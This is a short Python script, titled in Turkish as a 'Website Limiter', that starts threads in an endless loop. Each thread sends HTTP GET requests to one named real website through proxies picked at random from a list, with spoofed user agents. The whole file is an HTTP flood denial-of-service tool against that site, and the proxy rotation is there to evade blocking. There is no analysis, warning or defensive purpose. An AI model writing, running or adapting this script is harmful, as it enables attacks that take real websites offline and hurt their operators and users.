import requests, threading, os, random
from fake_useragent import UserAgent
from colorama import Fore, Style

ua = UserAgent()
count = 0
proxy = open("proxies.txt").read().splitlines()
headers = {
	"User-Agent": ua.random
}
def clear():
    os.system("cls")
    print(f"{Style.BRIGHT}{Fore.MAGENTA}Sismei Website Limiter{Fore.RESET}\n")
    print(f"Baslatildi!")
clear()

def randomproxy():
    return random.choice(proxy)

def main():
	try:
		global count
		requests.get(f"https://sonoyuncu.com.tr/", headers=headers, proxies={"http": 'http://' + randomproxy()})
		count += 1
		os.system(f'title Limiter: {count}')
	except Exception as e:
		pass

while True:
	thread = threading.Thread(target=main)
	thread.start()
